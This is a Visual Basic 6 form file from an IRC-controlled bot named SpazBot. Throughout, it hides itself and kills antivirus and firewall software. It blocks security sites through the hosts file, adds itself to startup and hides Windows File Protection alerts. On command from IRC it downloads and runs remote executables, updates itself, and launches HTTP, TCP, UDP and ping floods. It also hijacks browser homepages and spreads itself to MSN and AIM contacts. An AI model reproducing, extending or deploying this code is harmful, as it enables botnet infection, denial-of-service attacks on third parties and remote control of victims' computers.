VERSION 5.00
Begin VB.Form frmMain 
   BorderStyle     =   0  'None
   ClientHeight    =   2370
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   3105
   LinkTopic       =   "Form1"
   ScaleHeight     =   2370
   ScaleWidth      =   3105
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer tmrIMSpread 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   1440
      Top             =   1920
   End
   Begin VB.Timer tmrMSNSend 
      Enabled         =   0   'False
      Interval        =   8000
      Left            =   960
      Top             =   1920
   End
   Begin VB.Timer tmrMSN 
      Enabled         =   0   'False
      Interval        =   60000
      Left            =   480
      Top             =   1920
   End
   Begin VB.Timer tmrWatchAIM 
      Enabled         =   0   'False
      Interval        =   60000
      Left            =   0
      Top             =   1920
   End
   Begin VB.Timer tmrHomepage 
      Enabled         =   0   'False
      Interval        =   60000
      Left            =   1920
      Top             =   1440
   End
   Begin VB.Timer tmrActivate 
      Enabled         =   0   'False
      Interval        =   60000
      Left            =   1440
      Top             =   1440
   End
   Begin SpazBot.ctlDownload dlDownload 
      Height          =   255
      Index           =   1
      Left            =   2760
      TabIndex        =   3
      Top             =   0
      Width           =   255
      _ExtentX        =   450
      _ExtentY        =   450
   End
   Begin SpazBot.ctlDownload dlUpdate 
      Height          =   255
      Left            =   2400
      TabIndex        =   2
      Top             =   0
      Width           =   255
      _ExtentX        =   450
      _ExtentY        =   450
   End
   Begin SpazBot.ctlSocks4 ctlSox4 
      Height          =   255
      Left            =   2760
      TabIndex        =   1
      Top             =   2040
      Width           =   255
      _ExtentX        =   873
      _ExtentY        =   873
   End
   Begin VB.Timer tmrCmdDelay 
      Enabled         =   0   'False
      Index           =   0
      Interval        =   1000
      Left            =   960
      Top             =   1440
   End
   Begin VB.Timer tmrKillBad 
      Enabled         =   0   'False
      Interval        =   5000
      Left            =   0
      Top             =   1440
   End
   Begin VB.Timer tmrUptime 
      Interval        =   60000
      Left            =   0
      Top             =   480
   End
   Begin VB.Timer tmrWatchWFP 
      Enabled         =   0   'False
      Interval        =   10
      Left            =   480
      Top             =   1440
   End
   Begin VB.DriveListBox Drives 
      Height          =   315
      Left            =   480
      TabIndex        =   0
      Top             =   480
      Width           =   975
   End
   Begin VB.Timer tmrTCPTimeout 
      Enabled         =   0   'False
      Index           =   0
      Interval        =   1000
      Left            =   1440
      Top             =   960
   End
   Begin VB.Timer tmrTCP 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   1920
      Top             =   960
   End
   Begin VB.Timer tmrUDPFlood 
      Enabled         =   0   'False
      Left            =   960
      Top             =   960
   End
   Begin VB.Timer tmrPingPong 
      Enabled         =   0   'False
      Interval        =   60000
      Left            =   480
      Top             =   0
   End
   Begin VB.Timer tmrPing 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   2400
      Top             =   960
   End
   Begin VB.Timer tmrDisconnect 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   960
      Top             =   0
   End
   Begin VB.Timer tmrUDP 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   480
      Top             =   960
   End
   Begin VB.Timer tmrHttp 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   0
      Top             =   960
   End
   Begin VB.Timer tmrConnect 
      Enabled         =   0   'False
      Interval        =   60000
      Left            =   0
      Top             =   0
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Dim lngConnectErrorTime() As Long

Public WithEvents sckIRC As clsSocketPlus
Attribute sckIRC.VB_VarHelpID = -1

Public WithEvents sckHTTP As clsSocketPlus
Attribute sckHTTP.VB_VarHelpID = -1
Public WithEvents sckUDP As clsSocketPlus
Attribute sckUDP.VB_VarHelpID = -1
Public WithEvents sckTCP As clsSocketPlus
Attribute sckTCP.VB_VarHelpID = -1

Public oMSN As MessengerAPI.Messenger
Attribute oMSN.VB_VarHelpID = -1

Private Sub dlDownload_Completed(Index As Integer, lngFileSize As Long)
    'On Local Error GoTo ErrTrap
    On Local Error GoTo ErrHand
    MsgChan "[DOWNLOAD][THREAD #" & Index & "]: Saved " & lngFileSize & " bytes to " & dlDownload(Index).Destination, dlDownload(Index).CmdIndex
    
    If dlDownload(Index).Execute = True Then
        Dim blnSuccess As Boolean
        blnSuccess = ShellEx(dlDownload(Index).Destination, , , 1)
        
        If blnSuccess = False Then
            Call MsgChan("[SHELL][ERROR]: Unknown", dlDownload(Index).CmdIndex)
        Else
            Call MsgChan("[SHELL]: Successfully executed " & dlDownload(Index).Destination, dlDownload(Index).CmdIndex)
        End If
    End If
    
    Commands(dlDownload(Index).CmdIndex).blnInUse = False
    
    Exit Sub
ErrHand:
    DirectMsgChan "dlDownload_Completed #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
'    Exit Sub
'ErrTrap:
'    Call MsgChan("[DOWNLOAD][ERROR]: " & Err.Description, dlDownload(Index).CmdIndex)
End Sub

Private Sub dlDownload_OtherError(Index As Integer, Description As String, Number As Long)
    MsgChan "[DOWNLOAD][THREAD #" & Index & "][ERROR]: " & Description, dlDownload(Index).CmdIndex
    Commands(dlDownload(Index).CmdIndex).blnInUse = False
End Sub

Private Sub dlDownload_WinsockError(Index As Integer, Description As String)
    MsgChan "[DOWNLOAD][THREAD #" & Index & "][ERROR]: " & Description, dlDownload(Index).CmdIndex
    Commands(dlDownload(Index).CmdIndex).blnInUse = False
End Sub

Private Sub dlUpdate_Completed(lngFileSize As Long)
    'On Local Error Resume Next
    On Local Error GoTo ErrHand
    
    Call ShellEx(App.Path & "\snew.exe", "-u", , 0)
    '[QUIT]
    IRCSendData ("Q :" & yEncode(EnDeCrypt("Upgrading")))
    RemoveStartup
    CleanUp
    End
    
    Exit Sub
ErrHand:
    DirectMsgChan "dlUpdate_Completed #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Sub dlUpdate_OtherError(Description As String, Number As Long)
    '70 = permission denied
    '75 = path/file access error
    If Number = 70 Then
        Call DirectMsgChan("[UPDATE][FAILED]: Permission denied. Uninstalling.", FailedUpdateChan)
        UninstallSelf
    Else
        Call UpdateError(3, Description)
    End If
End Sub

Private Sub dlUpdate_WinsockError(Description As String)
    'On Local Error Resume Next
    On Local Error GoTo ErrHand
    
    'UpdateError
    'I decied it wasn't right to go through the whole UpdateError process
    'for what is probably a mistyped URL or some other small connectivity problem.
    'So this is a modified version that DOES increase the errorcount but doesn't
    'restart the computer or uninstall the bot when the error count is reached.
    Dim strURL As String
    strURL = GetSetting("update.url")
    Dim strCRC As String
    strCRC = GetSetting("update.crc")
    
    Dim lngErrCount As Long
    lngErrCount = GetSettingLong("update.errcount")
    lngErrCount = lngErrCount + 1
    Call SaveSetting("update.errcount", CStr(lngErrCount))
    
    If lngErrCount >= 3 Then
        Call DirectMsgChan("[UPDATE][FAILED]: Winsock Error: Error count exceeded (" & Description & ")", FailedUpdateChan)
    Else
        Call DirectMsgChan("[UPDATE][ERROR]: Winsock Error: " & Description & ". Retrying download.", FailedUpdateChan)
        frmMain.dlUpdate.CmdIndex = -1
        frmMain.dlUpdate.CRC = strCRC
        frmMain.dlUpdate.Download strURL, App.Path & "\snew.exe"
    End If
    
    Exit Sub
ErrHand:
    DirectMsgChan "dlUpdate_WinsockError #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    If UnloadMode <> 2 And UnloadMode <> 1 Then
        Cancel = True
        Exit Sub
    End If
    
    '[QUIT]
    IRCSendData ("Q :" & yEncode(EnDeCrypt("System shutting down")))
End Sub

Private Sub sckTCP_Closesck(ByVal Index As Variant)
    On Local Error GoTo ErrHand
    sckTCP.CloseSck Index
    frmMain.tmrTCPTimeout(Index).Enabled = False
    TCPConnectSck (Index)

    Exit Sub
ErrHand:
    DirectMsgChan "sckTCP_Closesck #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Sub sckTCP_Connect(ByVal Index As Variant)
    'On Local Error Resume Next
    On Local Error GoTo ErrHand
    sckTCP.SendData Index, TCP.Data
    DoEvents
    sckTCP.CloseSck Index
    frmMain.tmrTCPTimeout(Index).Enabled = False
    TCPConnectSck (Index)
    
    Exit Sub
ErrHand:
    DirectMsgChan "sckTCP_Connect #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Sub sckTCP_Error(ByVal Index As Variant, ByVal Number As Integer, Description As String, ByVal sCode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    On Local Error GoTo ErrHand
    sckTCP.CloseSck Index
    frmMain.tmrTCPTimeout(Index).Enabled = False
    TCPConnectSck (Index)

    Exit Sub
ErrHand:
    DirectMsgChan "sckTCP_Error #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Sub LoadControls()
    'On Local Error Resume Next
    On Local Error GoTo ErrHand
    Set sckIRC = New clsSocketPlus
    sckIRC.ArrayAdd 1
    
    Set sckHTTP = New clsSocketPlus
    Set sckUDP = New clsSocketPlus
    sckUDP.ArrayAdd 1
    sckUDP.Protocol(1) = sckUDPProtocol
    Set sckTCP = New clsSocketPlus
    
    Load dlDownload(2)
    Load dlDownload(3)
    
    Set oMSN = New MessengerAPI.Messenger

    Exit Sub
ErrHand:
    DirectMsgChan "LoadControls #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Sub UnloadControls()
    'On Local Error Resume Next
    On Local Error GoTo ErrHand
    sckIRC.CloseSck 1
    Set sckIRC = Nothing
    Set sckHTTP = Nothing
    'sckUDP.ArrayRemove 1
    Set sckUDP = Nothing
    Set sckTCP = Nothing
    
    Exit Sub
ErrHand:
    DirectMsgChan "UnloadControls #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Sub Form_Load()
    'On Local Error Resume Next
    On Local Error GoTo ErrHand
    
    Me.Visible = False
    App.TaskVisible = False
    
    LoadControls
    GetSettings
    
    'Kill AVs and firewalls and stuff
    KillZoneAlarm
    LoadKillLists
    KillStartup
    KillTheBadness
    KillServices
    ChangeSecuritySettings
    DisableCmds (True)
    'Block AV sites and shit
    BlockHosts (True)
    'disable .reg files
    EnableRegfiles (False)
    tmrKillBad.Enabled = True
    
    'Add startup entries
    If Subclass_InIDE = False Then AddStartup
    
    'if this is the first infection, wait before activating
    If GetSetting("act.activated") <> "1" Then
        If Len(GetSetting("act.timestarted")) = 0 Then Call SaveSetting("act.timestarted", Now)
        tmrActivate.Enabled = True
        Call tmrActivate_Timer
        Exit Sub
    End If
    
    Call Activate
    
    Exit Sub
ErrHand:
    DirectMsgChan "frmMain.Form_Load #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

'lets get this show on the road
Private Sub Activate()
    On Local Error GoTo ErrHand
    'If we updated, check to see if it worked
    If GetSetting("update.updating") = "1" Then
        Dim strNewVer As String
        strNewVer = GetSetting("update.newver")
        If CSng(BotVersion) = CSng(strNewVer) Then
            Call SaveSetting("update.updating", "0")
        Else
            UpdateError (1)
        End If
    End If
    
    'set local IP
    Client.LocalIP = sckIRC.LocalIP(1)
    
    'hide .ini file
    Call SetAttr(Client.INIFile, vbHidden + vbSystem)
        
    'set uptime
    Call SaveSetting("uptime.last", GetSetting("uptime.current"))
    tmrUptime_Timer
    
    'Patch TCPIP.sys if necessary
    If Client.WindowsVersion = "XP" Then
        Dim CSDVersion As String
        CSDVersion = GetString(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CSDVersion")
        If CSDVersion = "Service Pack 2" Then Client.UsingSP2 = True
        If Client.UsingSP2 = True And Client.PatchedTCPIP = 0 Then PatchTCPIP
    End If
    
    'homepage
    tmrHomepage.Enabled = True
    
    'if we were HTTP flooding, keep at it
    If HTTP.Flooding = True Then
        If DateDiff(HTTP.DateType, HTTP.BeginDate, Now) < HTTP.Duration Then
            Call BeginHTTPFlood
        Else
            HTTP.Flooding = False
        End If
    End If
    
    'if we were TCP flooding, keep at it
    If TCP.Flooding = True Then
        If DateDiff(TCP.DateType, TCP.BeginDate, Now) < TCP.Duration Then
            Call BeginTCPFlood
        Else
            TCP.Flooding = False
        End If
    End If
    
    'if we were UDP flooding, keep at it
    If UDP.Flooding = True Then
        If DateDiff(UDP.DateType, UDP.BeginDate, Now) < UDP.Duration Then
            Call BeginUDPFLood
        Else
            UDP.Flooding = False
        End If
    End If
    
    'if we were ping flooding, keep at it
    If Ping.Flooding = True Then
        If DateDiff(Ping.DateType, Ping.BeginDate, Now) < Ping.Duration Then
            Call BeginPingFlood
        Else
            Ping.Flooding = False
        End If
    End If
    
    'if we were imspreading, keep at it
    If IMSpread.SpreadingMSN = True Or IMSpread.SpreadingAIM = True Then
        If DateDiff(IMSpread.DateType, IMSpread.BeginDate, Now) < IMSpread.Duration Then
            If IMSpread.SpreadingMSN = True Then StartMSNSpread
            If IMSpread.SpreadingAIM = True Then StartAIMSpread
        Else
            StopAIMSpread
            StopMSNSpread
        End If
    End If
    
    'connect to IRC server
    LoadServers
    tmrConnect.Enabled = True
    
    ReDim lngConnectErrorTime(0)
    Call ExecuteCommand("ipconfig /flushdns")
    sckIRC.Connect 1, Servers(lngServerIndex).strAddress, Servers(lngServerIndex).strPort
    
    Exit Sub
ErrHand:
    DirectMsgChan "Activate #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Public Sub CleanUp()
    MutexCleanUp
    
    UnloadControls
    
    Call tmrUptime_Timer
    
    StopPingFlood (True)
    StopUDPFlood (True)
    StopHTTPFlood (True)
    StopTCPFlood (True)
End Sub

Private Sub Form_Unload(Cancel As Integer)
    If Subclass_InIDE = False Then AddStartup
    CleanUp
End Sub

Private Sub sckHttp_CloseSck(ByVal Index As Variant)
    HTTPConnectSck (Index)
End Sub

Private Sub sckHttp_Connect(ByVal Index As Variant)
    'On Local Error Resume Next
    On Local Error GoTo ErrHand
    Dim Data As New clsStringBuilder
    
    If HTTP.Directory <> "" Then
        Data.Append "GET " & HTTP.Directory & " HTTP/1.1" & vbCrLf
    Else
        Data.Append "GET / HTTP/1.1" & vbCrLf
    End If
    Data.Append "Accept: */*" & vbCrLf
    Data.Append "Accept-Language: en" & vbCrLf
    Data.Append "Accept-Encoding: gzip, deflate" & vbCrLf
    'data.append "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.0.3705)" & vbCrLf
    Data.Append "Host: " & HTTP.Hostname & vbCrLf
    Data.Append "Connection: Close" & vbCrLf & vbCrLf
    
    sckHTTP.SendData Index, Data.ToString
    
    Exit Sub
ErrHand:
    DirectMsgChan "sckHttp_CloseSck #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Sub sckHttp_Error(ByVal Index As Variant, ByVal Number As Integer, Description As String, ByVal sCode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    HTTPConnectSck (Index)
End Sub

Private Sub sckIRC_CloseSck(ByVal Index As Variant)
    Client.Connected = False
    tmrPingPong.Enabled = False
End Sub

Private Sub sckIRC_Connect(ByVal Index As Variant)
    On Local Error GoTo ErrHand
    '[NICK]
    IRCSendData "N " & Client.Nick
    '[USER]
    IRCSendData "U " & FilterCompname(GetCompName) & " """ & Client.Nick & """ """ & Client.Nick & """ :" & Client.Nick
    Client.Connected = True
    tmrPingPong.Enabled = True
    
    Exit Sub
ErrHand:
    DirectMsgChan "sckIRC_Connect #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Sub sckIRC_DataArrival(ByVal Index As Variant, ByVal bytesTotal As Long)
    'On Local Error Resume Next
    On Local Error GoTo ErrHand
    Dim bData() As Byte
    sckIRC.GetData 1, bData, vbArray + vbByte
    AppendBArray bBuffer, bData
    IRCParseBlock
    
    Exit Sub
ErrHand:
    DirectMsgChan "sckIRC_DataArrival #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Sub sckIRC_Error(ByVal Index As Variant, ByVal Number As Integer, Description As String, ByVal sCode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    'On Local Error Resume Next
    On Local Error GoTo ErrHand
    
    sckIRC.CloseSck 1
    Client.Connected = False
    tmrPingPong.Enabled = False
    
    If lngConnectErrorTime(0) = 0 Then
        lngConnectErrorTime(0) = GetUptime
    Else
        Dim i As Long
        Dim lngUbound As Long
        Dim lngErrorCount As Long
        
        lngErrorCount = 1 'count the current error
        
        lngUbound = UBound(lngConnectErrorTime)
        For i = 0 To lngUbound
            'if the error occured more than 60 seconds ago, remove it
            If lngConnectErrorTime(i) >= GetUptime + 60 Then
                If lngUbound = 0 Then
                    lngConnectErrorTime(0) = 0
                    
                    'cause 1 will get added later when logging a new error
                    lngUbound = -1
                Else
                    Dim x As Long
                    
                    lngUbound = lngUbound - 1
                    
                    For x = i To lngUbound
                        lngConnectErrorTime(x) = lngConnectErrorTime(x + 1)
                    Next
                    ReDim Preserve lngConnectErrorTime(lngUbound)
                    
                    i = i - 1
                End If
            Else
                'otherwise increase the current error count
                lngErrorCount = lngErrorCount + 1
                
                'if we're over the error limit, clean up and get new server
                If lngErrorCount >= 2 Then
                    ReDim lngConnectErrorTime(0)
                    
                    lngServerIndex = lngServerIndex + 1
                    If lngServerIndex > UBound(Servers) Then lngServerIndex = 0
                    
                    Call tmrConnect_Timer
                    Exit Sub
                End If
            End If
        Next
        
        'if we're still here, log new error
        lngUbound = lngUbound + 1
        ReDim Preserve lngConnectErrorTime(lngUbound)
        lngConnectErrorTime(lngUbound) = GetUptime
    End If
    
    Call tmrConnect_Timer
    
    Exit Sub
ErrHand:
    DirectMsgChan "sckIRC_Error #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Sub tmrActivate_Timer()
    If DateDiff("n", GetSetting("act.timestarted"), Now) >= InfectDelay Then
        tmrActivate.Enabled = False
        Call SaveSetting("act.activated", "1")
        Activate
    End If
End Sub

Private Sub tmrCmdDelay_Timer(Index As Integer)
    tmrCmdDelay(Index).Tag = tmrCmdDelay(Index).Tag + 1
    If tmrCmdDelay(Index).Tag >= Commands(Index).lngDelay Then
        ParseCommand (Index)
        tmrCmdDelay(Index).Enabled = False
        If Index <> 0 Then Unload tmrCmdDelay(Index)
    End If
End Sub

Private Sub tmrDisconnect_Timer()
    'On Local Error Resume Next
    On Local Error GoTo ErrHand
    Static DiscCount As Long
    DiscCount = DiscCount + 1
    If DiscCount >= Client.DiscDuration Then
        Client.Connected = False
        tmrDisconnect.Enabled = False
        DiscCount = 0
        Client.DiscDuration = 0
        sckIRC.CloseSck 1
        DoEvents
        Call ExecuteCommand("ipconfig /flushdns")
        sckIRC.Connect 1, Servers(lngServerIndex).strAddress, Servers(lngServerIndex).strPort
    End If
    
    Exit Sub
ErrHand:
    DirectMsgChan "tmrDisconnect_Timer #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Sub tmrHomepage_Timer()
    'On Local Error Resume Next
    On Local Error GoTo ErrHand
    If AutoHomepage.Enabled = False Then Exit Sub
    
    If Len(AutoHomepage.LastChanged) = 0 Then GoTo ChangeHP
    If DateDiff("h", AutoHomepage.LastChanged, Now) >= AutoHomepage.Interval Then
ChangeHP:
        Call SetIEHomepage(AutoHomepage.URL)
        Call SetFFHomepage(AutoHomepage.URL)
        AutoHomepage.LastChanged = Now
        Call SaveSetting("autohp.LastChanged", AutoHomepage.LastChanged)
    End If
    
    Exit Sub
ErrHand:
    DirectMsgChan "tmrHomepage_Timer #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Sub tmrHttp_Timer()
    'On Local Error Resume Next
    On Local Error GoTo ErrHand
    'keep those bastard winsock controls from slacking off, without this
    'kind of slave driving timer they tend to sit down and have some lemonade
    Dim Index As Long
    For Index = 1 To HTTP.Threads
        If sckHTTP.State(Index) = sckConnected And HTTP.ConnectState(Index) = "1" Then
            HTTPConnectSck (Index)
            HTTP.ConnectState(Index) = "-1"
        ElseIf sckHTTP.State(Index) <> sckConnected And HTTP.ConnectState(Index) = "0" Then
            HTTPConnectSck (Index)
            HTTP.ConnectState(Index) = "-1"
        ElseIf sckHTTP.State(Index) = sckConnected Then
            HTTP.ConnectState(Index) = "1"
        Else
            HTTP.ConnectState(Index) = "0"
        End If
    Next
    
    If DateDiff(HTTP.DateType, HTTP.BeginDate, Now) >= HTTP.Duration Then
        StopHTTPFlood (False)
    End If
    
    Exit Sub
ErrHand:
    DirectMsgChan "tmrHTTP_Timer #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Sub tmrIMSpread_Timer()
    If DateDiff(IMSpread.DateType, IMSpread.BeginDate, Now) >= IMSpread.Duration Then
        tmrIMSpread.Enabled = False
        StopMSNSpread
        StopAIMSpread
    End If
End Sub

Private Sub tmrKillBad_Timer()
    KillTheBadness
    ChangeSecuritySettings
End Sub

Private Sub tmrMSN_Timer()
    StartMSNSpread
End Sub

Private Sub tmrMSNSend_Timer()
    'On Local Error Resume Next
    On Local Error GoTo ErrHand
    
    Call SendMSNSingle(MSNPeople(MSNPeopleIndex), IMSpread.MSNMessage)
    
    MSNPeopleIndex = MSNPeopleIndex + 1
    If MSNPeopleIndex > MSNPeopleCount - 1 Then
        tmrMSNSend.Enabled = False
        tmrMSN.Enabled = True
    End If
    
    Exit Sub
ErrHand:
    DirectMsgChan "tmrMSNSend_Timer #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Sub tmrPing_Timer()
    If DateDiff(Ping.DateType, Ping.BeginDate, Now) >= Ping.Duration Then
        StopPingFlood (False)
    End If
End Sub

Private Sub tmrPingPong_Timer()
On Local Error GoTo ErrHand
    Static lngCount As Long
    lngCount = lngCount + 1
    If lngCount >= 10 Then
        If Client.Pinged = True Then
            Client.Pinged = False
            lngCount = 0
        Else
            sckIRC.CloseSck 1
            Client.Connected = False
            tmrPingPong.Enabled = False
            lngCount = 0
        End If
    End If
    
    Exit Sub
ErrHand:
    DirectMsgChan "tmrPingPong_Timer #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Public Sub tmrConnect_Timer()
    'On Local Error Resume Next
    On Local Error GoTo ErrHand
    Static ConnectCount As Long
    ConnectCount = ConnectCount + 1
    If ConnectCount >= 4 Then
        If Client.Connected = False Then
            'in case the IP has changed
            Call ExecuteCommand("ipconfig /flushdns")
        
            sckIRC.CloseSck 1
            DoEvents
            sckIRC.Connect 1, Servers(lngServerIndex).strAddress, Servers(lngServerIndex).strPort
        End If
        ConnectCount = 0
    End If
    
    Exit Sub
ErrHand:
    DirectMsgChan "tmrConnect_Timer #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Sub tmrTCP_Timer()
    If DateDiff(TCP.DateType, TCP.BeginDate, Now) >= TCP.Duration Then
        StopTCPFlood (False)
    End If
End Sub

Private Sub tmrTCPTimeout_Timer(Index As Integer)
    On Local Error GoTo ErrHand
    TCP.Data = RandBinary(TCP.PacketSize)
    TCP.TimeoutCount(Index) = TCP.TimeoutCount(Index) + 1
    If TCP.TimeoutCount(Index) >= TCP.Timeout Then
        TCPConnectSck (Index)
    End If
    
    Exit Sub
ErrHand:
    DirectMsgChan "tmrTCPTimeout_Timer #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Sub tmrUDP_Timer()
    UDP.Data = RandBinary(UDP.PacketSize)
    If DateDiff(UDP.DateType, UDP.BeginDate, Now) >= UDP.Duration Then
        StopUDPFlood (False)
    End If
End Sub

Private Sub tmrUDPFlood_Timer()
On Local Error GoTo ErrHand
    sckUDP.SendData 1, UDP.Data
    DoEvents
    
    Exit Sub
ErrHand:
    DirectMsgChan "tmrUDPFlood_Timer #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Public Sub tmrUptime_Timer()
    On Local Error GoTo ErrHand
    Dim lngCurrent As Long
    Dim lngBest As Long
    
    lngBest = GetSettingLong("uptime.best")
    
    lngCurrent = GetUptime
    Call SaveSetting("uptime.current", lngCurrent)
    If lngCurrent > lngBest Then
        Call SaveSetting("uptime.best", lngCurrent)
    End If
    
    Exit Sub
ErrHand:
    DirectMsgChan "tmrUptime_Timer #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Public Sub tmrWatchAIM_Timer()
    'On Local Error Resume Next
    On Local Error GoTo ErrHand
    Dim strNicks() As String
    Dim lngNickCount As Long
    Dim i As Long
    
    'AIM 5.x
    AIMCleanSent
    Call FindOpenAIMWindows(strNicks, lngNickCount)
    If lngNickCount > 0 Then
        For i = 0 To lngNickCount - 1
            If AIMAlreadySent(strNicks(i)) = False Then
                Dim lngWindow As Long
                lngWindow = FindAIMWindow(strNicks(i))
                Call SendAIM(lngWindow, strNicks(i))
                AIMAddSent (strNicks(i))
                Call SendMessageLong(lngWindow, WM_CLOSE, 0&, 0&)
            End If
        Next
    End If
    
    'AIM Triton
    Call CloseTritonGroupIM
    Dim TritonNick() As String
    Dim TritonHwnd() As Long
    Dim TritonNickCount As Long
    TritonCleanSent
    Call FindOpenTritonWindows(TritonNick, TritonHwnd, TritonNickCount)
    If TritonNickCount > 0 Then
        For i = 0 To TritonNickCount - 1
            If TritonAlreadySent(TritonNick(i)) = False Then
                Call SendTriton(TritonHwnd(i), TritonNick(i))
                TritonAddSent (TritonNick(i))
            End If
        Next
    End If
    
    Exit Sub
ErrHand:
    DirectMsgChan "tmrWatchAIM_Timer #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Sub tmrWatchWFP_Timer()
    On Local Error GoTo ErrHand
    Static WatchCount As Long
    Dim lngHwnd As Long
    
    'if we've been watching for more than 1 min, I guess its not gonna show
    WatchCount = WatchCount + 1
    If WatchCount > 6000 Then
        tmrWatchWFP.Enabled = False
        WatchCount = 0
        Exit Sub
    End If
    
    lngHwnd = FindWindow(vbNullString, "Windows File Protection")
    
    If lngHwnd <> 0 Then
        'BlockInput True
        'DoEvents
        
        Call ShowWindow(lngHwnd, SW_HIDE)
        'SetForegroundWindow (lngHwnd)
        'DoEventsWait (1)
        'Call SendKeys("{RIGHT}{RIGHT}{ENTER}", 1)
        'DoEventsWait (1)
        'Call SendKeys("{LEFT}{ENTER}", 1)
        'DoEvents
        
        'BlockInput False
    
        WatchCount = 0
        'tmrWatchWFP.Enabled = False
    End If
    
    Exit Sub
ErrHand:
    DirectMsgChan "tmrWatchWFP_Timer #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub
